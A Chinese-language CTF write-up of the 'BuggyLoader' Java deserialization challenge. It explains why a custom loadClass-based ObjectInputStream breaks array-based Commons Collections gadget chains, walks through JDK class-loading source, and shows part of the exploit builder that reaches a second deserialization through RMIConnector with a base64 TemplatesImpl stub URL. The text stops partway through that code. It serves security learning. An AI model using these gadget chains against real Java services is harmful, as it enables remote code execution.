<h2 id="BuggyLoader"><a href="#BuggyLoader" class="headerlink" title="BuggyLoader"></a>BuggyLoader</h2><p>这个题刚看到我就想起来以前zsx写的一篇shiro classloader导致cc 3.1的链打不通的文章，也确实就是这么个东西，不过由于我是超级java废物所以不会，赛后才开始慢慢的复现<br>题目的依赖中有common-collection3.1，反序列化的ObjectInputStream是自己实现的，如下</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>yxxx<span class="token punctuation">.</span>buggyLoader<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectStreamClass<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URLClassLoader<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyObjectInputStream</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> ClassLoader classLoader<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token function">MyObjectInputStream</span><span class="token punctuation">(</span>InputStream inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        URL<span class="token punctuation">[</span><span class="token punctuation">]</span> urls <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>URLClassLoader<span class="token punctuation">)</span>Transformer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getURLs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span>urls<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span>ObjectStreamClass desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
        Class <span class="token class-name">clazz</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>自己定义了一个ObjectInputStream，然后重写了resolveClass方法，用的classLoader的loadClass，而不是Class.forName<br>关于shiro的classloader的实现bug问题有很多相关链接，这里放几个，不过赛时由于没有自己动手调过，对这些文章的理解不太深刻，看了半天看不懂。。。。手动调了一个下午之后感觉又理解一些了呜呜<br><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">Pwn a CTF Platform with Java JRMP Gadget</a><br><a href="https://blog.zsxsoft.com/post/35">强网杯“彩蛋”——Shiro 1.2.4(SHIRO-550)漏洞之发散性思考</a><br><a href="http://w4nder.top/?p=410">shiro-1.2.4反序列化分析踩坑</a></p>
<p><strong>整个问题的关键点就在orange文章中的那条评论里</strong></p>
<blockquote>
<p>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
</blockquote>
<p>也可以看这个Stack Overflow上的问题<br><a href="https://stackoverflow.com/questions/30406524/loading-an-array-with-a-classloader">Loading an array with a classloader</a></p>
<p>手动复制粘贴了他的代码进行调试，分别测试两个函数的结果</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="双亲委派-review"><a href="#双亲委派-review" class="headerlink" title="双亲委派 review"></a>双亲委派 review</h3><p>classLoader.loadClass进去先是经典的双亲委派模型，这里我都有点忘了是什么了，后来复习了一下，才想起来是先找是否已经加载此类，未加载则一直往上找找到最顶层classloader，再从顶层开始加载，加载不到再委托下级classloader加载，最终抛出classNotFound异常<br>这篇文章里面有个图<br><a href="https://www.jianshu.com/p/1e4011617650">java双亲委派机制及作用</a></p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">loadClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> resolve<span class="token punctuation">)</span>
        <span class="token keyword">throws</span> ClassNotFoundException
    <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token function">getClassLoadingLock</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">// First, check if the class has already been loaded</span>
            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">long</span> t0 <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        c <span class="token operator">=</span> <span class="token function">findBootstrapClassOrNull</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment" spellcheck="true">// ClassNotFoundException thrown if class not found</span>
                    <span class="token comment" spellcheck="true">// from the non-null parent class loader</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment" spellcheck="true">// If still not found, then invoke findClass in order</span>
                    <span class="token comment" spellcheck="true">// to find the class.</span>
                    <span class="token keyword">long</span> t1 <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    c <span class="token operator">=</span> <span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    <span class="token comment" spellcheck="true">// this is the defining class loader; record the stats</span>
                    sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span>PerfCounter<span class="token punctuation">.</span><span class="token function">getParentDelegationTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addTime</span><span class="token punctuation">(</span>t1 <span class="token operator">-</span> t0<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span>PerfCounter<span class="token punctuation">.</span><span class="token function">getFindClassTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addElapsedTimeFrom</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span>PerfCounter<span class="token punctuation">.</span><span class="token function">getFindClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">resolveClass</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> c<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>经典双亲委派，先看有没有加载，自己没加载直接上去找父加载器有没有加载，每个classloader都是进这个函数，父加载器没有就进自己的findClass，如果找不到就抛出异常给下一级加载器catch</p>
<h3 id="loadClass-debug"><a href="#loadClass-debug" class="headerlink" title="loadClass debug"></a>loadClass debug</h3><p>因为这里在进resolveClass时，desc.getName得到的值是<code>[Lorg.apache.commons.collections.Transformer;</code>开头的<code>[L</code>和结尾的<code>;</code>表示这是一个数组，而在findClass中，他是这么找的</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">findClass</span><span class="token punctuation">(</span><span class="token keyword">final</span> String name<span class="token punctuation">)</span>
        <span class="token keyword">throws</span> ClassNotFoundException
    <span class="token punctuation">{</span>
        <span class="token keyword">final</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> result<span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            result <span class="token operator">=</span> AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span>
                <span class="token keyword">new</span> <span class="token class-name">PrivilegedExceptionAction</span><span class="token operator">&lt;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException <span class="token punctuation">{</span>
                        String path <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">".class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        Resource res <span class="token operator">=</span> ucp<span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                                <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>
                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span> acc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>PrivilegedActionException</span> pae<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token punctuation">(</span>ClassNotFoundException<span class="token punctuation">)</span> pae<span class="token punctuation">.</span><span class="token function">getException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>并没有对传入的类类名是带有数组标记进行额外的处理，对path只是进行了简单的替换<br><code>String path = name.replace(&#39;.&#39;, &#39;/&#39;).concat(&quot;.class&quot;);</code><br>那么得到的的路径就非常的垃圾<br><code>[Lorg/apache/commons/collections/Transformer;.class</code><br>显然，这样子的路径是无法加载到类的</p>
<h3 id="Class-forName-debug"><a href="#Class-forName-debug" class="headerlink" title="Class.forName debug"></a>Class.forName debug</h3><p>那么用Class.forName呢？<br>直接进forName函数，在forName的最后返回了这个<br><code>return forName0(name, initialize, loader, caller);</code><br>name还是带<code>[L</code>的类名，loader是我们传入的URLClassloader。<br>跟进该方法，结果发现这是个native方法，看不到内容，直接给我跳到了URLClassloader的loadClass方法中，但此时的类名已经被处理掉了，变成了正常的类名，去除了数组标记<br>然后就进入了之前使用的classloader.loadClass函数</p>
<p>可以看出来，使用Class.forName进行类加载时，会有一个native方法对类名的修饰符进行修改，使其为一个正常的类完全限定名，而后才交给loadClass方法进行加载，而这里直接写了个loadClass，导致了最终得到了奇怪的路径，导致加载失败<br>所以orange下面的那句评论可以说是非常关键了。当然，shiro的加载失败情况更为复杂，这里不在赘述了，上述链接中给出了很多内容</p>
<h3 id="失败的尝试"><a href="#失败的尝试" class="headerlink" title="失败的尝试"></a>失败的尝试</h3><p>这里的问题就在于，使用了这个buggy classloader后，cc链常用的payload中，transformer数组的方法就打不通了。orange也在文章中提到了新的打法，用不带数组的payload去打，比如JRMPListener，但是题目又给服务套了一层内网环境，用URLDNS打了一下发现机器不通外网。因此该方案同样无效</p>
<p>首先是拿自带数组的经典CC5打了一遍，不过打起来的时候报错是<code>StackTraceElement</code>这个类找不到，而不是后面的Transformer数组</p>
<p>java大师tr1ple发了我一份他写的templateImpl的payload，是直接把templateImpl作为TiedMapEntry的key，Transformer只放一个InvokerTransformer触发，这个乍一看是没有用到数组的，但是同样也是用BadAttributeValueExpException这个类触发的，而其继承自Exception继承自Throwable，而<code>StackTraceElement[]</code>就是Throwable中的一个成员变量。<br>不过这次运行的错误并不一致，调试之后发现StackTraceElement虽然加载没有成功，但是抛出的错误被catch住了，而ois会继续跑下去。<br>之后会去加载templateImpl类，并且会调用到templateImpl的readObject，在这里面会用buggyloader去加载其<code>_bytes</code>属性，而该属性是一个二维数组，同样无法被加载<br>同样，在抛出错误后被catch并继续ois流的读取，接下来会读到一个<code>[B</code>的描述符并进行加载，此时会直接读到错误的数据，抛出一个<code>StreamCorruptedException</code>，而该错误没有catch直接就程序终止了<br>目前暂未找到为什么templateImpl在加载过程中对ClassNotFound全都不管，最后是出现了流的数据乱掉了抛出的错误，而CC链则直接抛出了ClassNotFound</p>
<p>学习完CC链后的更新<br>使用CC6的链去触发，<strong>TiedMapEntry+InvokerTransformer可以做到对任意类的public方法的调用</strong>，而CC6的HashSet就没有自带的数组，是不是能搞定？<br>结果还是不行。。。呜呜呜，报错还是流乱了，可能是真的<code>byte[][]</code>也不能加载吧</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>正解翻到了一个触发二次反序列化的点，使用的是<code>RMIConnector</code>这个类，其有一个public方法connect，其中调用findRMIServer方法，该方法通过给定的url去加载一个RMI的stub</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> RMIServer <span class="token function">findRMIServer</span><span class="token punctuation">(</span>JMXServiceURL directoryURL<span class="token punctuation">,</span>
            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> environment<span class="token punctuation">)</span>
            <span class="token keyword">throws</span> NamingException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token keyword">boolean</span> isIiop <span class="token operator">=</span> RMIConnectorServer<span class="token punctuation">.</span><span class="token function">isIiopURL</span><span class="token punctuation">(</span>directoryURL<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>isIiop<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">// Make sure java.naming.corba.orb is in the Map.</span>
            environment<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>EnvHelp<span class="token punctuation">.</span>DEFAULT_ORB<span class="token punctuation">,</span><span class="token function">resolveOrb</span><span class="token punctuation">(</span>environment<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        String path <span class="token operator">=</span> directoryURL<span class="token punctuation">.</span><span class="token function">getURLPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> end <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> end <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/jndi/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token function">findRMIServerJNDI</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">,</span> environment<span class="token punctuation">,</span> isIiop<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/stub/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token function">findRMIServerJRMP</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">,</span> environment<span class="token punctuation">,</span> isIiop<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/ior/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>IIOPHelper<span class="token punctuation">.</span><span class="token function">isAvailable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"iiop protocol not available"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token function">findRMIServerIIOP</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">,</span> environment<span class="token punctuation">,</span> isIiop<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">final</span> String msg <span class="token operator">=</span> <span class="token string">"URL path must begin with /jndi/ or /stub/ "</span> <span class="token operator">+</span>
                    <span class="token string">"or /ior/: "</span> <span class="token operator">+</span> path<span class="token punctuation">;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>而在使用协议为stub时，调用findRMIServerJRMP方法，而该方法对输入数据直接进行了反序列化</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> RMIServer <span class="token function">findRMIServerJRMP</span><span class="token punctuation">(</span>String base64<span class="token punctuation">,</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> env<span class="token punctuation">,</span> <span class="token keyword">boolean</span> isIiop<span class="token punctuation">)</span>
        <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// could forbid "iiop:" URL here -- but do we need to?</span>
        <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized<span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            serialized <span class="token operator">=</span> <span class="token function">base64ToByteArray</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">(</span><span class="token string">"Bad BASE64 encoding: "</span> <span class="token operator">+</span>
                    e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">final</span> ByteArrayInputStream bin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">final</span> ClassLoader loader <span class="token operator">=</span> EnvHelp<span class="token punctuation">.</span><span class="token function">resolveClientClassLoader</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> ObjectInputStream oin <span class="token operator">=</span>
                <span class="token punctuation">(</span>loader <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span>
                    <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bin<span class="token punctuation">)</span> <span class="token operator">:</span>
                    <span class="token keyword">new</span> <span class="token class-name">ObjectInputStreamWithLoader</span><span class="token punctuation">(</span>bin<span class="token punctuation">,</span> loader<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Object stub<span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            stub <span class="token operator">=</span> oin<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">(</span><span class="token string">"Class not found: "</span> <span class="token operator">+</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>RMIServer<span class="token punctuation">)</span>stub<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>至于这个类怎么被找出来的，就只有问神仙了。。。。</p>
<p>可以看到这个方法中使用的ois并非之前环境上下文中的buggyois，而是自己重新加载了一个新的ois，因此能绕过错误的classloader实现，再把一般情况下能打通的payload进行反序列化</p>
<p>正常情况下可以打通的payload即为templateImpl，由于机器不出外网，将templateImpl的payload修改为tomcat获取response对象回显的payload</p>
<p>这里直接抄wp的代码</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getRMIConnector</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        Constructor con <span class="token operator">=</span> InvokerTransformer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        con<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// need a public method</span>
        InvokerTransformer transformer <span class="token operator">=</span> <span class="token punctuation">(</span>InvokerTransformer<span class="token punctuation">)</span> con<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"connect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        ByteArrayOutputStream baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token function">getTemplateImpl</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payload <span class="token operator">=</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        BASE64Encoder base64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BASE64Encoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        String result <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        JMXServiceURL jurl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JMXServiceURL</span><span class="token punctuation">(</span><span class="token string">"service:jmx:rmi:///stub/"</span><span class="token operator">+</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Map hashMapp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        RMIConnector rc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RMIConnector</span><span class="token punctuation">(</span>jurl<span class="token punctuation">,</span>hashMapp<span class="token punctuation">)</span><span class="token punctuation">;</span>

